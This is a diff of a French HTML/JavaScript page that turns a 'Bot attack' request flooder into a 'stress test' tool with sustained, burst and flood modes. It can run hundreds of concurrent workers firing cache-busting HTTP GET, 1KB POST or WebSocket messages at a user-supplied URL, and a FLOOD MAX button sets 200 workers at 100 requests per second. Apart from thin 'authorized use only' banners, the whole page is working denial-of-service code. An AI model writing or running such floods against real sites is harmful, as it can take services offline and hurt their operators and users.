@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot attack</title>
+    <title>Bot Test Charge Intensive - Cybersécurité</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -26,14 +26,17 @@
             border-radius: 16px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             padding: 40px;
-            max-width: 700px;
+            max-width: 800px;
             width: 100%;
         }
 
         h1 {
-            color: #333;
+            color: #dc2626;
             margin-bottom: 10px;
             font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .subtitle {
@@ -56,7 +59,6 @@
 
         input[type="text"],
         input[type="number"],
-        input[type="url"],
         select {
             width: 100%;
             padding: 12px 16px;
@@ -68,42 +70,27 @@
 
         input:focus, select:focus {
             outline: none;
-            border-color: #667eea;
-        }
-
-        input[type="range"] {
-            width: 100%;
-            margin-top: 8px;
+            border-color: #dc2626;
         }
 
         .value-display {
             display: inline-block;
-            background: #f0f0f0;
+            background: #fee2e2;
             padding: 4px 12px;
             border-radius: 6px;
             font-weight: 600;
-            color: #667eea;
+            color: #dc2626;
             margin-left: 10px;
         }
 
-        .input-group {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .input-group input[type="number"] {
-            flex: 1;
-        }
-
         .button-group {
-            display: flex;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 15px;
             margin-top: 30px;
         }
 
         button {
-            flex: 1;
             padding: 14px 24px;
             border: none;
             border-radius: 8px;
@@ -114,13 +101,13 @@
         }
 
         .btn-start {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
             color: white;
         }
 
         .btn-start:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 6px 20px rgba(220, 38, 38, 0.4);
         }
 
         .btn-stop {
@@ -131,7 +118,26 @@
         .btn-stop:hover:not(:disabled) {
             background: #dc2626;
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .btn-burst {
+            background: #f97316;
+            color: white;
+        }
+
+        .btn-burst:hover:not(:disabled) {
+            background: #ea580c;
+            transform: translateY(-2px);
+        }
+
+        .btn-flood {
+            background: #7c2d12;
+            color: white;
+        }
+
+        .btn-flood:hover:not(:disabled) {
+            background: #991b1b;
+            transform: translateY(-2px);
         }
 
         button:disabled {
@@ -142,60 +148,93 @@
         .stats {
             margin-top: 30px;
             padding: 20px;
-            background: #f8f9fa;
+            background: #fee2e2;
             border-radius: 8px;
-            border-left: 4px solid #667eea;
+            border-left: 4px solid #dc2626;
         }
 
         .stats h3 {
-            color: #333;
+            color: #991b1b;
             margin-bottom: 15px;
             font-size: 18px;
         }
 
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding: 8px 0;
-            border-bottom: 1px solid #e0e0e0;
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
         }
 
-        .stat-row:last-child {
-            border-bottom: none;
+        .stat-card {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         .stat-label {
             color: #666;
-            font-size: 14px;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
         }
 
         .stat-value {
+            font-weight: 700;
+            color: #dc2626;
+            font-size: 24px;
+        }
+
+        .stat-value.good {
+            color: #10b981;
+        }
+
+        .danger-warning {
+            background: #991b1b;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
             font-weight: 600;
-            color: #333;
+            text-align: center;
+        }
+
+        .mode-selector {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .mode-card {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .mode-card:hover {
+            border-color: #dc2626;
+        }
+
+        .mode-card.active {
+            background: #fee2e2;
+            border-color: #dc2626;
+        }
+
+        .mode-card h4 {
+            color: #dc2626;
+            margin-bottom: 5px;
             font-size: 14px;
         }
 
-        .status-indicator {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-
-        .status-connected {
-            background: #10b981;
-            box-shadow: 0 0 8px rgba(16, 185, 129, 0.6);
-        }
-
-        .status-disconnected {
-            background: #6b7280;
-        }
-
-        .status-error {
-            background: #ef4444;
-            box-shadow: 0 0 8px rgba(239, 68, 68, 0.6);
+        .mode-card p {
+            color: #666;
+            font-size: 12px;
+            margin: 0;
         }
 
         .logs {
@@ -203,7 +242,7 @@
             background: #1e293b;
             border-radius: 8px;
             padding: 15px;
-            max-height: 250px;
+            max-height: 300px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -215,189 +254,133 @@
             line-height: 1.5;
         }
 
-        .log-entry.success {
-            color: #10b981;
+        .log-entry.attack {
+            color: #f97316;
+            font-weight: 600;
         }
 
         .log-entry.error {
             color: #ef4444;
         }
 
-        .log-entry.info {
-            color: #3b82f6;
+        .log-entry.success {
+            color: #10b981;
         }
 
-        .warning {
-            background: #fef3c7;
-            border-left: 4px solid #f59e0b;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #92400e;
-        }
-
-        .danger-warning {
-            background: #fee2e2;
-            border-left: 4px solid #ef4444;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #991b1b;
-            font-weight: 600;
-        }
-
-        .advanced-options {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        .advanced-options h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 16px;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: auto;
-            margin-right: 10px;
-        }
-
-        .performance-warning {
-            background: #fef3c7;
-            padding: 10px;
-            border-radius: 6px;
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            overflow: hidden;
             margin-top: 10px;
-            font-size: 12px;
-            color: #92400e;
-            display: none;
         }
 
-        .performance-warning.show {
-            display: block;
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #dc2626, #f97316);
+            width: 0%;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Bot attack</h1>
-        <p class="subtitle">Attaque de sites web statiques par saturation de requêtes</p>
+        <h1>⚡ STRESS TEST INTENSIF</h1>
+        <p class="subtitle">Test de charge aggressif pour audit de cybersécurité</p>
 
         <div class="danger-warning">
-            ⚠️ ATTENTION : Cet outil est destiné uniquement aux tests autorisés :3
+            ⚠️ OUTIL DE PENTESTING - Utilisation autorisée uniquement sur VOS systèmes
+        </div>
+
+        <div class="mode-selector">
+            <div class="mode-card active" data-mode="sustained">
+                <h4>🔄 SOUTENU</h4>
+                <p>Charge continue et constante</p>
+            </div>
+            <div class="mode-card" data-mode="burst">
+                <h4>💥 RAFALE</h4>
+                <p>Pics d'activité intense</p>
+            </div>
+            <div class="mode-card" data-mode="flood">
+                <h4>🌊 FLOOD</h4>
+                <p>Saturation maximale</p>
+            </div>
         </div>
 
         <div class="form-group">
-            <label for="url">URL cible (WebSocket ou HTTP)</label>
-            <input type="text" id="url" placeholder="wss://example.com/socket ou https://example.com" value="wss://echo.websocket.org/">
+            <label for="url">URL cible</label>
+            <input type="text" id="url" placeholder="https://votre-site.com/api/endpoint" value="">
         </div>
 
         <div class="form-group">
-            <label for="protocol">Type de connexion</label>
-            <select id="protocol">
-                <option value="websocket">WebSocket</option>
-                <option value="http">HTTP (requêtes répétées)</option>
+            <label for="attack-type">Type d'attaque</label>
+            <select id="attack-type">
+                <option value="http-post">HTTP POST (API/Forms)</option>
+                <option value="http-get">HTTP GET (Pages/Resources)</option>
+                <option value="websocket">WebSocket (Connexions)</option>
+                <option value="mixed">Mixte (POST + GET)</option>
             </select>
         </div>
 
         <div class="form-group">
-            <label for="connections">
-                Nombre de connexions simultanées
-                <span class="value-display" id="connections-value">10</span>
+            <label for="threads">
+                Workers simultanés
+                <span class="value-display" id="threads-value">50</span>
             </label>
-            <input type="range" id="connections" min="1" max="1000" value="10">
-            <div class="input-group" style="margin-top: 10px;">
-                <input type="number" id="connections-input" min="1" max="1000" value="10" placeholder="Ou entrez un nombre">
-            </div>
-            <div class="performance-warning" id="perf-warning-connections">
-                ⚠️ Attention : Plus de 100 connexions peuvent surcharger votre navigateur
-            </div>
+            <input type="number" id="threads" min="1" max="500" value="50">
         </div>
 
         <div class="form-group">
-            <label for="interval">
-                Intervalle entre messages (ms)
-                <span class="value-display" id="interval-value">1000</span>
+            <label for="requests-per-second">
+                Requêtes par seconde (par worker)
+                <span class="value-display" id="rps-value">10</span>
             </label>
-            <input type="range" id="interval" min="1" max="5000" step="1" value="1000">
-            <div class="input-group" style="margin-top: 10px;">
-                <input type="number" id="interval-input" min="1" max="10000" value="1000" placeholder="Ou entrez un nombre (ms)">
-            </div>
-            <div class="performance-warning" id="perf-warning-interval">
-                ⚠️ Attention : Un intervalle < 10ms peut créer une charge extrême
-            </div>
+            <input type="number" id="requests-per-second" min="1" max="1000" value="10">
         </div>
 
-        <div class="advanced-options">
-            <h3>⚙️ Options avancées</h3>
-            
-            <div class="checkbox-group">
-                <input type="checkbox" id="random-delay" checked>
-                <label for="random-delay" style="margin-bottom: 0;">Délai aléatoire entre connexions (0-200ms)</label>
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="custom-payload">
-                <label for="custom-payload" style="margin-bottom: 0;">Payload personnalisé</label>
-            </div>
-
-            <div class="form-group" id="payload-group" style="display: none; margin-top: 15px; margin-bottom: 0;">
-                <label for="payload">Données JSON à envoyer</label>
-                <textarea id="payload" rows="4" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-family: monospace; font-size: 13px;">{"action": "test", "data": "hello"}</textarea>
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="reconnect">
-                <label for="reconnect" style="margin-bottom: 0;">Reconnexion automatique en cas d'erreur</label>
-            </div>
+        <div class="form-group">
+            <label for="duration">Durée du test (secondes, 0 = infini)</label>
+            <input type="number" id="duration" min="0" max="3600" value="60">
         </div>
 
         <div class="button-group">
-            <button class="btn-start" id="start-btn">🚀 Démarrer le test</button>
-            <button class="btn-stop" id="stop-btn" disabled>🛑 Arrêter</button>
+            <button class="btn-start" id="start-btn">🚀 LANCER L'ATTAQUE</button>
+            <button class="btn-stop" id="stop-btn" disabled>🛑 STOP</button>
+            <button class="btn-burst" id="burst-btn">💥 BURST (5s)</button>
+            <button class="btn-flood" id="flood-btn">🌊 FLOOD MAX</button>
         </div>
 
         <div class="stats">
-            <h3>📊 Statistiques en temps réel</h3>
-            <div class="stat-row">
-                <span class="stat-label">État</span>
-                <span class="stat-value">
-                    <span class="status-indicator status-disconnected" id="status-indicator"></span>
-                    <span id="status-text">Inactif</span>
-                </span>
+            <h3>📊 Métriques d'attaque</h3>
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Requêtes totales</div>
+                    <div class="stat-value" id="total-requests">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Req/sec actuel</div>
+                    <div class="stat-value" id="current-rps">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Succès (2xx)</div>
+                    <div class="stat-value good" id="success-count">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Erreurs/Blocages</div>
+                    <div class="stat-value" id="error-count">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Workers actifs</div>
+                    <div class="stat-value" id="active-workers">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Temps écoulé</div>
+                    <div class="stat-value" id="elapsed-time">00:00</div>
+                </div>
             </div>
-            <div class="stat-row">
-                <span class="stat-label">Connexions actives</span>
-                <span class="stat-value" id="active-connections">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Messages envoyés</span>
-                <span class="stat-value" id="messages-sent">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Messages reçus</span>
-                <span class="stat-value" id="messages-received">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Erreurs</span>
-                <span class="stat-value" id="errors">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Taux d'envoi (msg/sec)</span>
-                <span class="stat-value" id="send-rate">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Durée du test</span>
-                <span class="stat-value" id="duration">00:00:00</span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
             </div>
         </div>
 
@@ -405,90 +388,48 @@
     </div>
 
     <script>
-        const urlInput = document.getElementById('url');
-        const protocolSelect = document.getElementById('protocol');
-        const connectionsInput = document.getElementById('connections');
-        const connectionsInputNumber = document.getElementById('connections-input');
-        const intervalInput = document.getElementById('interval');
-        const intervalInputNumber = document.getElementById('interval-input');
-        const startBtn = document.getElementById('start-btn');
-        const stopBtn = document.getElementById('stop-btn');
-        const logsContainer = document.getElementById('logs');
-        const randomDelayCheckbox = document.getElementById('random-delay');
-        const customPayloadCheckbox = document.getElementById('custom-payload');
-        const payloadTextarea = document.getElementById('payload');
-        const payloadGroup = document.getElementById('payload-group');
-        const reconnectCheckbox = document.getElementById('reconnect');
-
-        let connections = [];
-        let intervals = [];
         let isRunning = false;
-        let startTime = null;
-        let durationInterval = null;
+        let workers = [];
         let stats = {
-            active: 0,
-            sent: 0,
-            received: 0,
+            total: 0,
+            success: 0,
             errors: 0,
-            lastSecondSent: 0,
+            activeWorkers: 0,
+            startTime: null,
+            lastSecondCount: 0,
             lastSecondTime: Date.now()
         };
+        let currentMode = 'sustained';
+        let stopTimeout = null;
 
-        // Synchronisation des inputs range et number
-        connectionsInput.addEventListener('input', (e) => {
-            const value = e.target.value;
-            document.getElementById('connections-value').textContent = value;
-            connectionsInputNumber.value = value;
-            
-            // Avertissement de performance
-            if (value > 100) {
-                document.getElementById('perf-warning-connections').classList.add('show');
-            } else {
-                document.getElementById('perf-warning-connections').classList.remove('show');
-            }
+        const urlInput = document.getElementById('url');
+        const attackTypeSelect = document.getElementById('attack-type');
+        const threadsInput = document.getElementById('threads');
+        const rpsInput = document.getElementById('requests-per-second');
+        const durationInput = document.getElementById('duration');
+        const startBtn = document.getElementById('start-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const burstBtn = document.getElementById('burst-btn');
+        const floodBtn = document.getElementById('flood-btn');
+        const logsContainer = document.getElementById('logs');
+
+        // Mode selection
+        document.querySelectorAll('.mode-card').forEach(card => {
+            card.addEventListener('click', () => {
+                document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
+                card.classList.add('active');
+                currentMode = card.dataset.mode;
+                addLog(`Mode changé: ${currentMode.toUpperCase()}`, 'success');
+            });
         });
 
-        connectionsInputNumber.addEventListener('input', (e) => {
-            let value = parseInt(e.target.value) || 1;
-            value = Math.max(1, Math.min(1000, value));
-            connectionsInput.value = value;
-            document.getElementById('connections-value').textContent = value;
-            
-            if (value > 100) {
-                document.getElementById('perf-warning-connections').classList.add('show');
-            } else {
-                document.getElementById('perf-warning-connections').classList.remove('show');
-            }
+        // Update displays
+        threadsInput.addEventListener('input', (e) => {
+            document.getElementById('threads-value').textContent = e.target.value;
         });
 
-        intervalInput.addEventListener('input', (e) => {
-            const value = e.target.value;
-            document.getElementById('interval-value').textContent = value;
-            intervalInputNumber.value = value;
-            
-            // Avertissement de performance
-            if (value < 10) {
-                document.getElementById('perf-warning-interval').classList.add('show');
-            } else {
-                document.getElementById('perf-warning-interval').classList.remove('show');
-            }
-        });
-
-        intervalInputNumber.addEventListener('input', (e) => {
-            let value = parseInt(e.target.value) || 1;
-            value = Math.max(1, Math.min(10000, value));
-            intervalInput.value = value;
-            document.getElementById('interval-value').textContent = value;
-            
-            if (value < 10) {
-                document.getElementById('perf-warning-interval').classList.add('show');
-            } else {
-                document.getElementById('perf-warning-interval').classList.remove('show');
-            }
-        });
-
-        customPayloadCheckbox.addEventListener('change', (e) => {
-            payloadGroup.style.display = e.target.checked ? 'block' : 'none';
+        rpsInput.addEventListener('input', (e) => {
+            document.getElementById('rps-value').textContent = e.target.value;
         });
 
         function addLog(message, type = 'info') {
@@ -496,259 +437,232 @@
             const logEntry = document.createElement('div');
             logEntry.className = `log-entry ${type}`;
             logEntry.textContent = `[${time}] ${message}`;
-            logsContainer.appendChild(logEntry);
-            logsContainer.scrollTop = logsContainer.scrollHeight;
+            logsContainer.insertBefore(logEntry, logsContainer.firstChild);
             
-            // Limiter le nombre de logs pour éviter les problèmes de mémoire
-            if (logsContainer.children.length > 100) {
-                logsContainer.removeChild(logsContainer.firstChild);
+            if (logsContainer.children.length > 50) {
+                logsContainer.removeChild(logsContainer.lastChild);
             }
         }
 
         function updateStats() {
-            document.getElementById('active-connections').textContent = stats.active;
-            document.getElementById('messages-sent').textContent = stats.sent;
-            document.getElementById('messages-received').textContent = stats.received;
-            document.getElementById('errors').textContent = stats.errors;
-            
-            // Calculer le taux d'envoi
+            document.getElementById('total-requests').textContent = stats.total.toLocaleString();
+            document.getElementById('success-count').textContent = stats.success.toLocaleString();
+            document.getElementById('error-count').textContent = stats.errors.toLocaleString();
+            document.getElementById('active-workers').textContent = stats.activeWorkers;
+
+            // Calculate RPS
             const now = Date.now();
             const elapsed = (now - stats.lastSecondTime) / 1000;
             if (elapsed >= 1) {
-                const rate = Math.round((stats.sent - stats.lastSecondSent) / elapsed);
-                document.getElementById('send-rate').textContent = rate;
-                stats.lastSecondSent = stats.sent;
+                const rps = Math.round((stats.total - stats.lastSecondCount) / elapsed);
+                document.getElementById('current-rps').textContent = rps.toLocaleString();
+                stats.lastSecondCount = stats.total;
                 stats.lastSecondTime = now;
             }
-        }
 
-        function updateDuration() {
-            if (!startTime) return;
-            
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            const hours = Math.floor(elapsed / 3600).toString().padStart(2, '0');
-            const minutes = Math.floor((elapsed % 3600) / 60).toString().padStart(2, '0');
-            const seconds = (elapsed % 60).toString().padStart(2, '0');
-            
-            document.getElementById('duration').textContent = `${hours}:${minutes}:${seconds}`;
-        }
+            // Update elapsed time
+            if (stats.startTime) {
+                const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
+                const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
+                const secs = (elapsed % 60).toString().padStart(2, '0');
+                document.getElementById('elapsed-time').textContent = `${mins}:${secs}`;
 
-        function updateStatus(status) {
-            const indicator = document.getElementById('status-indicator');
-            const text = document.getElementById('status-text');
-            
-            if (status === 'running') {
-                indicator.className = 'status-indicator status-connected';
-                text.textContent = 'Actif';
-            } else if (status === 'error') {
-                indicator.className = 'status-indicator status-error';
-                text.textContent = 'Erreur';
-            } else {
-                indicator.className = 'status-indicator status-disconnected';
-                text.textContent = 'Inactif';
-            }
-        }
-
-        function getPayload(id) {
-            if (customPayloadCheckbox.checked) {
-                try {
-                    const custom = JSON.parse(payloadTextarea.value);
-                    return JSON.stringify({ ...custom, bot_id: id, timestamp: Date.now() });
-                } catch (e) {
-                    addLog('Erreur dans le payload personnalisé, utilisation du payload par défaut', 'error');
+                // Update progress
+                const duration = parseInt(durationInput.value);
+                if (duration > 0) {
+                    const progress = Math.min((elapsed / duration) * 100, 100);
+                    document.getElementById('progress').style.width = progress + '%';
                 }
             }
-            
-            return JSON.stringify({
-                bot_id: id,
-                timestamp: Date.now(),
-                action: 'ping'
-            });
         }
 
-        function createWebSocketConnection(id, url, messageInterval) {
+        async function sendRequest(url, type, workerId) {
             try {
-                const ws = new WebSocket(url);
+                let response;
                 
-                ws.onopen = () => {
-                    stats.active++;
-                    updateStats();
-                    if (id <= 10 || id % 100 === 0) {
-                        addLog(`Bot #${id} connecté`, 'success');
-                    }
-                    
-                    // Envoyer des messages périodiques
-                    const interval = setInterval(() => {
-                        if (ws.readyState === WebSocket.OPEN) {
-                            ws.send(getPayload(id));
-                            stats.sent++;
-                            updateStats();
-                        }
-                    }, messageInterval);
-                    
-                    intervals.push(interval);
-                };
-
-                ws.onmessage = (event) => {
-                    stats.received++;
-                    updateStats();
-                };
-
-                ws.onerror = (error) => {
-                    stats.errors++;
-                    updateStats();
-                    if (id <= 10 || stats.errors % 50 === 0) {
-                        addLog(`Bot #${id} erreur`, 'error');
-                    }
-                    updateStatus('error');
-                };
-
-                ws.onclose = () => {
-                    stats.active--;
-                    updateStats();
-                    
-                    // Reconnexion automatique si activée
-                    if (reconnectCheckbox.checked && isRunning) {
-                        setTimeout(() => {
-                            if (isRunning) {
-                                createWebSocketConnection(id, url, messageInterval);
+                if (type === 'websocket') {
+                    // Pour WebSocket, on crée une connexion et on envoie plusieurs messages
+                    return new Promise((resolve) => {
+                        const ws = new WebSocket(url.replace('http', 'ws'));
+                        ws.onopen = () => {
+                            for (let i = 0; i < 10; i++) {
+                                ws.send(JSON.stringify({ worker: workerId, msg: i, timestamp: Date.now() }));
+                                stats.total++;
                             }
-                        }, 1000);
-                    }
-                };
-
-                connections.push(ws);
-            } catch (error) {
-                stats.errors++;
-                updateStats();
-                addLog(`Erreur création Bot #${id}: ${error.message}`, 'error');
-            }
-        }
-
-        function createHttpConnection(id, url, messageInterval) {
-            stats.active++;
-            updateStats();
-            if (id <= 10 || id % 100 === 0) {
-                addLog(`Bot HTTP #${id} démarré`, 'success');
-            }
-
-            const interval = setInterval(async () => {
-                if (!isRunning) return;
-                
-                try {
-                    const response = await fetch(url, {
+                            stats.success++;
+                            ws.close();
+                            resolve();
+                        };
+                        ws.onerror = () => {
+                            stats.errors++;
+                            resolve();
+                        };
+                    });
+                } else if (type === 'http-post' || type === 'mixed') {
+                    response = await fetch(url, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: getPayload(id)
+                        body: JSON.stringify({
+                            worker: workerId,
+                            timestamp: Date.now(),
+                            data: 'x'.repeat(1000) // 1KB payload
+                        }),
+                        cache: 'no-store'
                     });
-
-                    stats.sent++;
-                    if (response.ok) {
-                        stats.received++;
-                    } else {
-                        stats.errors++;
-                    }
-                    updateStats();
-                } catch (error) {
-                    stats.errors++;
-                    updateStats();
-                    
-                    // Reconnexion automatique si activée
-                    if (reconnectCheckbox.checked && isRunning) {
-                        // Continue avec l'intervalle existant
-                    }
+                } else {
+                    response = await fetch(url + '?worker=' + workerId + '&t=' + Date.now(), {
+                        method: 'GET',
+                        cache: 'no-store'
+                    });
                 }
-            }, messageInterval);
 
-            intervals.push(interval);
+                stats.total++;
+                if (response && response.ok) {
+                    stats.success++;
+                } else {
+                    stats.errors++;
+                }
+            } catch (error) {
+                stats.total++;
+                stats.errors++;
+            }
         }
 
-        startBtn.addEventListener('click', () => {
+        async function workerLoop(workerId, url, type, rps, mode) {
+            stats.activeWorkers++;
+            
+            while (isRunning) {
+                const interval = mode === 'flood' ? 0 : (1000 / rps);
+                const burst = mode === 'burst' ? Math.floor(Math.random() * 5) + 1 : 1;
+                
+                // Send multiple requests in parallel for burst/flood
+                const promises = [];
+                for (let i = 0; i < burst; i++) {
+                    promises.push(sendRequest(url, type, workerId));
+                }
+                
+                await Promise.all(promises);
+                
+                if (interval > 0) {
+                    await new Promise(resolve => setTimeout(resolve, interval));
+                }
+            }
+            
+            stats.activeWorkers--;
+        }
+
+        function startAttack(mode = null) {
             const url = urlInput.value.trim();
-            const protocol = protocolSelect.value;
-            const numConnections = parseInt(connectionsInput.value);
-            const messageInterval = parseInt(intervalInput.value);
+            const type = attackTypeSelect.value;
+            const numThreads = parseInt(threadsInput.value);
+            const rps = parseInt(rpsInput.value);
+            const duration = parseInt(durationInput.value);
 
             if (!url) {
-                addLog('Veuillez entrer une URL', 'error');
+                addLog('⚠️ Veuillez entrer une URL cible', 'error');
                 return;
             }
 
-            // Confirmation pour charge élevée
-            if (numConnections > 500 || messageInterval < 10) {
-                if (!confirm(`ATTENTION : Vous allez lancer ${numConnections} connexions avec un intervalle de ${messageInterval}ms.\n\nCela peut créer une charge TRÈS élevée sur votre système et le serveur cible.\n\nÊtes-vous sûr de vouloir continuer ?`)) {
-                    return;
-                }
+            const attackMode = mode || currentMode;
+
+            if (!confirm(`🚨 ATTENTION 🚨\n\nVous allez lancer ${numThreads} workers à ${rps} req/s\nMode: ${attackMode.toUpperCase()}\n\nCela peut SATURER votre serveur !\n\nConfirmer ?`)) {
+                return;
             }
 
-            // Réinitialiser les stats
-            stats = { active: 0, sent: 0, received: 0, errors: 0, lastSecondSent: 0, lastSecondTime: Date.now() };
-            updateStats();
-            logsContainer.innerHTML = '';
+            // Reset
+            stats = {
+                total: 0,
+                success: 0,
+                errors: 0,
+                activeWorkers: 0,
+                startTime: Date.now(),
+                lastSecondCount: 0,
+                lastSecondTime: Date.now()
+            };
 
             isRunning = true;
             startBtn.disabled = true;
             stopBtn.disabled = false;
-            updateStatus('running');
-            startTime = Date.now();
-            
-            // Démarrer le timer de durée
-            durationInterval = setInterval(updateDuration, 1000);
+            burstBtn.disabled = true;
+            floodBtn.disabled = true;
 
-            addLog(`🚀 Démarrage de ${numConnections} bots...`, 'info');
-            addLog(`📊 Intervalle: ${messageInterval}ms | Protocole: ${protocol.toUpperCase()}`, 'info');
+            addLog(`🚀 ATTAQUE LANCÉE - ${numThreads} workers | ${rps} req/s | Mode: ${attackMode}`, 'attack');
+            addLog(`🎯 Cible: ${url} | Type: ${type}`, 'attack');
 
-            // Créer les connexions
-            for (let i = 1; i <= numConnections; i++) {
-                const delay = randomDelayCheckbox.checked ? Math.random() * 200 : (i - 1);
-                
-                setTimeout(() => {
-                    if (!isRunning) return;
-                    
-                    if (protocol === 'websocket') {
-                        createWebSocketConnection(i, url, messageInterval);
-                    } else {
-                        createHttpConnection(i, url, messageInterval);
-                    }
-                }, delay);
+            // Start workers
+            for (let i = 0; i < numThreads; i++) {
+                workers.push(workerLoop(i, url, type, rps, attackMode));
             }
-        });
 
-        stopBtn.addEventListener('click', () => {
-            addLog('🛑 Arrêt de tous les bots...', 'info');
-
-            isRunning = false;
-
-            // Fermer toutes les connexions WebSocket
-            connections.forEach(ws => {
-                if (ws && ws.readyState === WebSocket.OPEN) {
-                    ws.close();
+            // Update stats display
+            const statsInterval = setInterval(() => {
+                if (!isRunning) {
+                    clearInterval(statsInterval);
+                    return;
                 }
-            });
+                updateStats();
+            }, 100);
 
-            // Arrêter tous les intervalles
-            intervals.forEach(interval => clearInterval(interval));
+            // Auto-stop after duration
+            if (duration > 0) {
+                stopTimeout = setTimeout(() => {
+                    stopAttack();
+                    addLog(`⏱️ Test terminé après ${duration}s`, 'success');
+                }, duration * 1000);
+            }
+        }
 
-            if (durationInterval) {
-                clearInterval(durationInterval);
-                durationInterval = null;
+        function stopAttack() {
+            isRunning = false;
+            workers = [];
+            
+            if (stopTimeout) {
+                clearTimeout(stopTimeout);
+                stopTimeout = null;
             }
 
-            connections = [];
-            intervals = [];
-            stats.active = 0;
             startBtn.disabled = false;
             stopBtn.disabled = true;
-            updateStats();
-            updateStatus('stopped');
+            burstBtn.disabled = false;
+            floodBtn.disabled = false;
 
-            const finalDuration = document.getElementById('duration').textContent;
-            addLog(`✅ Test terminé - Durée: ${finalDuration} - Messages: ${stats.sent}`, 'success');
+            const duration = Math.floor((Date.now() - stats.startTime) / 1000);
+            const avgRps = Math.floor(stats.total / duration);
+            
+            addLog(`✅ ATTAQUE STOPPÉE - Total: ${stats.total} req | Moy: ${avgRps} req/s`, 'success');
+            addLog(`📊 Succès: ${stats.success} | Erreurs: ${stats.errors}`, 'success');
+        }
+
+        startBtn.addEventListener('click', () => startAttack());
+        stopBtn.addEventListener('click', stopAttack);
+
+        burstBtn.addEventListener('click', () => {
+            const originalDuration = durationInput.value;
+            durationInput.value = 5;
+            startAttack('burst');
+            setTimeout(() => {
+                durationInput.value = originalDuration;
+            }, 5000);
         });
 
-        // Initialisation
+        floodBtn.addEventListener('click', () => {
+            const originalThreads = threadsInput.value;
+            const originalRps = rpsInput.value;
+            threadsInput.value = 200;
+            rpsInput.value = 100;
+            durationInput.value = 10;
+            
+            startAttack('flood');
+            
+            setTimeout(() => {
+                threadsInput.value = originalThreads;
+                rpsInput.value = originalRps;
+            }, 10000);
+        });
+
+        // Initialize
         updateStats();
     </script>
 </body>
